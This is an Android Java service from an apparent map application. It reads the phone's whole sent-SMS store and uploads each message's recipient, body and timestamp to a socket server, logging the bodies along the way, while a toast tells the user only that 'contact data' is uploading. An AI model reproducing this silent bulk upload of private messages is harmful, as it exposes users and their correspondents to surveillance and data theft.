package com.bhagya.mapapplication.services;

import android.app.IntentService;
import android.content.ContentValues;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.support.v4.os.ResultReceiver;
import android.util.Log;
import android.widget.Toast;

import com.androidquery.AQuery;
import com.androidquery.callback.AjaxCallback;
import com.androidquery.callback.AjaxStatus;
import com.bhagya.mapapplication.activityclass.DatabaseHelper;
import com.bhagya.mapapplication.socket.SocketConnection;
import com.facebook.AccessToken;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class UploadOutboxService extends IntentService {
    SocketConnection socketConnection = new SocketConnection();
    public UploadOutboxService() {
        super("UploadOutboxService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
       uploadOutbox();
    }

    public void uploadOutbox() {
        SharedPreferences preferences = getSharedPreferences("MAIN_USER_RECORD", MODE_PRIVATE);
        String  userId = preferences.getString("user_id", "");
        Uri sentURI = Uri.parse("content://sms/sent");
        Cursor cursor = getContentResolver().query(sentURI, new String[]{"_id", "address", "date", "body","thread_id"}, null, null, null);
        cursor.moveToFirst();

        do {
            String smsId, address,body,date,thread_id;
            JSONObject params = new JSONObject();
            smsId = cursor.getString(0);
            address = cursor.getString(1);
            body = cursor.getString(3);
            date=cursor.getString(2);
            Log.d("OUTBOX",body);
            try {
                params.put("smsId",smsId);
                params.put("contactNo",address);
                params.put("content",body);
                params.put("timeStamps",date);
                params.put("userId",userId);
                socketConnection.rsocket.emit("uploadOutbox",params);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }while (cursor.moveToNext());
    }

    @Override
    public int onStartCommand(@Nullable Intent intent, int flags, int startId) {
        Toast.makeText(this,"Conatact Data Uploading",Toast.LENGTH_LONG).show();
        socketConnection.connectSocket(AccessToken.getCurrentAccessToken().getToken());
        Toast.makeText(this,"Conatact Data Uploading",Toast.LENGTH_LONG).show();
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
//        super.onDestroy();
//        ResultReceiver rec = intentresult.getParcelableExtra("receiverTag");
//        Bundle b= new Bundle();
//        b.putString("ServiceTag","Rajiv");
//        rec.send(0,b);
//        Log.d("ServicesDetroyed","ok");
//        Toast.makeText(this,"Conatact Data Uploaded Successfully",Toast.LENGTH_LONG).show();

    }

}
